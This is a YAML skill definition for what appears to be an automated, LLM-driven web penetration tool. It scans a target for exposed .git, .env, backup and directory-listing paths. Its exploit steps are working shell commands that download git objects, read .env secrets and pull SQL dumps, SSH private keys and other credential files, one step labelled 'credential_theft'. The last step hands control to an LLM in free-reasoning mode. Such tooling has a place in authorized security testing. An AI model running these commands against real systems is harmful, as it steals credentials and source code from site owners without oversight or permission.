skill_id: directory_discovery
name: "Web 目录/路径发现与目录列表利用"
category: server_misconfig
version: "2.0"

principle: |
  递归扫描 Web 目录，发现隐藏的管理后台、配置文件、备份文件、
  信息泄露端点。当发现 Apache/Nginx "Index of" 目录列表页时，
  递归爬取其中的文件和子目录，重点提取有价值的文件。
  工具链: feroxbuster(快速递归) → dirsearch(全面) → gobuster。
  重点关注: 管理后台、.git/.env/.bak、phpinfo、目录遍历、
  源码文件、配置文件、数据库dump、密钥文件。

match:
  rules:
    - evidence_contains: ["directory listing"]
    - evidence_contains: ["目录遍历"]
    - evidence_contains: ["directory traversal"]
    - evidence_contains: ["index of"]
    - evidence_contains: ["information disclosure", "sensitive"]
    - evidence_contains: ["sensitive file"]
    - evidence_contains: ["敏感路径"]
    - evidence_contains: ["敏感文件"]
    - evidence_contains: [".git", "exposed"]
    - evidence_contains: [".env", "exposed"]

probes:
  - id: quick_dir_scan
    description: "feroxbuster 快速递归目录扫描"
    command: |
      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
      echo "=== Feroxbuster Quick Scan ==="
      feroxbuster -u "$BASE" -w /usr/share/seclists/Discovery/Web-Content/common.txt \
        -t 20 -d 2 --no-state -q --status-codes 200,301,302,403 \
        --timeout 8 2>/dev/null | head -80
      echo "DIR_SCAN_DONE"
    timeout: 120
    parse_rules:
      - if_contains: ["200"]
        set: { found_paths: true }
      - if_contains: ["admin"]
        set: { admin_panel: true }
      - if_contains: [".git"]
        set: { git_exposed: true }
      - if_contains: [".env"]
        set: { env_exposed: true }
      - if_contains: ["phpinfo"]
        set: { phpinfo_exposed: true }
      - if_contains: ["manager"]
        set: { manager_found: true }
      - if_contains: ["console"]
        set: { console_found: true }

  - id: check_sensitive_files
    description: "检查敏感文件泄露"
    command: |
      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
      echo "=== Sensitive File Check ==="
      for path in /.git/HEAD /.env /robots.txt /sitemap.xml /.htaccess \
                  /wp-config.php.bak /config.php.bak /web.config \
                  /backup.zip /backup.tar.gz /dump.sql; do
        code=$(curl -s -o /dev/null -w "%{http_code}" "$BASE$path" --max-time 5 2>/dev/null)
        if [ "$code" = "200" ]; then
          echo "SENSITIVE_FILE:$path (HTTP 200)"
          curl -s "$BASE$path" --max-time 5 2>/dev/null | head -5
        fi
      done
      echo "SENSITIVE_CHECK_DONE"
    timeout: 60
    parse_rules:
      - if_contains: ["SENSITIVE_FILE"]
        set: { sensitive_files: true }
      - if_contains: [".git/HEAD"]
        set: { git_exposed: true }

  - id: crawl_directory_listings
    description: "检测并爬取 Index of 目录列表页"
    command: |
      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
      echo "=== Directory Listing Crawl ==="
      for dir in / /files/ /uploads/ /backup/ /data/ /download/ /public/ /static/ /images/ /docs/; do
        BODY=$(curl -sS -L --max-time 8 "$BASE$dir" 2>/dev/null)
        if echo "$BODY" | grep -qi "Index of\|Parent Directory\|<title>Index of"; then
          echo "DIRLIST_FOUND:$dir"
          echo "$BODY" | grep -oP 'href="\K[^"]+' | head -30 | while read -r link; do
            case "$link" in
              ../*|?*|#*|javascript:*|mailto:*) continue ;;
            esac
            echo "  ENTRY:$dir$link"
          done
          for sub in $(echo "$BODY" | grep -oP 'href="\K[^"]+/' | head -10); do
            case "$sub" in
              ../*) continue ;;
            esac
            SUBBODY=$(curl -sS -L --max-time 5 "$BASE$dir$sub" 2>/dev/null)
            if echo "$SUBBODY" | grep -qi "Index of\|Parent Directory"; then
              echo "  SUBDIR:$dir$sub"
              echo "$SUBBODY" | grep -oP 'href="\K[^"]+' | head -20 | while read -r sublink; do
                case "$sublink" in
                  ../*|?*|#*) continue ;;
                esac
                echo "    SUBENTRY:$dir$sub$sublink"
              done
            fi
          done
        fi
      done
      echo "DIRLIST_CRAWL_DONE"
    timeout: 120
    parse_rules:
      - if_contains: ["DIRLIST_FOUND"]
        set: { directory_listing: true }
      - if_regex: "ENTRY:.*\\.(sql|db|sqlite|bak|backup|zip|tar|gz|key|pem|conf|env|log|php|py|sh)"
        set: { interesting_files: true }
      - if_regex: "ENTRY:.*\\.(key|pem|id_rsa|ppk|p12)"
        set: { credential_files: true }

exploit_paths:
  - path_id: git_dump
    name: ".git 源码泄露利用"
    priority: 1
    conditions:
      git_exposed: true
    steps:
      - id: dump_git
        description: "下载 .git 目录并提取源码"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          echo "=== Git Dump ==="
          cd /tmp && rm -rf git_dump
          for f in HEAD config refs/heads/master objects/info/packs; do
            echo "--- $f ---"
            curl -s "$BASE/.git/$f" --max-time 5 2>/dev/null | head -5
          done
          echo "GIT_DUMP_DONE"
        timeout: 30
        success_criteria:
          stdout_contains_any: ["ref:", "repositoryformatversion", "GIT_DUMP_DONE"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "info_disclosure"

  - path_id: env_leak
    name: ".env 配置泄露"
    priority: 2
    conditions:
      env_exposed: true
    steps:
      - id: read_env
        description: "读取 .env 文件内容"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          echo "=== .env Content ==="
          curl -s "$BASE/.env" --max-time 10 2>/dev/null
          echo "ENV_READ_DONE"
        timeout: 15
        success_criteria:
          stdout_contains_any: ["DB_", "SECRET", "PASSWORD", "KEY", "TOKEN"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "info_disclosure"

  - path_id: dirlist_interesting_files
    name: "目录列表中的有价值文件下载"
    priority: 3
    conditions:
      interesting_files: true
    steps:
      - id: download_interesting
        description: "下载目录列表中发现的敏感文件"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          echo "=== Downloading Interesting Files ==="
          for ext in sql db sqlite bak backup conf env log key pem; do
            for dir in / /files/ /uploads/ /backup/ /data/; do
              BODY=$(curl -sS -L --max-time 5 "$BASE$dir" 2>/dev/null)
              FILES=$(echo "$BODY" | grep -oP "href=\"\K[^\"]+\.$ext" | head -3)
              for f in $FILES; do
                echo "--- $dir$f ---"
                curl -sS --max-time 10 "$BASE$dir$f" 2>/dev/null | head -50
                echo ""
              done
            done
          done
          echo "INTERESTING_DOWNLOAD_DONE"
        timeout: 60
        success_criteria:
          stdout_contains_any: ["password", "secret", "token", "key", "db_", "mysql", "postgres", "root", "admin", "CREATE TABLE", "INSERT INTO"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "info_disclosure"

  - path_id: dirlist_credential_files
    name: "目录列表中的密钥/凭据文件"
    priority: 2
    conditions:
      credential_files: true
    steps:
      - id: download_creds
        description: "下载密钥和凭据文件"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          echo "=== Credential File Download ==="
          for dir in / /files/ /uploads/ /backup/ /data/ /.ssh/ /keys/; do
            BODY=$(curl -sS -L --max-time 5 "$BASE$dir" 2>/dev/null)
            for pattern in id_rsa id_dsa id_ecdsa id_ed25519 "*.pem" "*.key" "*.ppk" "*.p12"; do
              FILES=$(echo "$BODY" | grep -oiP "href=\"\K[^\"]*($pattern)[^\"]*" | head -3)
              for f in $FILES; do
                echo "--- $dir$f ---"
                curl -sS --max-time 10 "$BASE$dir$f" 2>/dev/null | head -30
                echo ""
              done
            done
          done
          echo "CRED_DOWNLOAD_DONE"
        timeout: 60
        success_criteria:
          stdout_contains_any: ["PRIVATE KEY", "RSA PRIVATE", "ssh-rsa", "PuTTY"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "credential_theft"

  - path_id: llm_freeform
    name: "LLM 自由推理"
    priority: 99
    mode: react_freeform
    max_rounds: 5

remediation: |
  1. 删除或限制访问 .git、.env 等敏感文件
  2. 配置 Web 服务器禁止目录列表（autoindex off）
  3. 移除备份文件和调试端点
  4. 使用 .htaccess 或 nginx deny 规则保护敏感路径
  5. 敏感密钥文件不应放在 Web 可访问目录
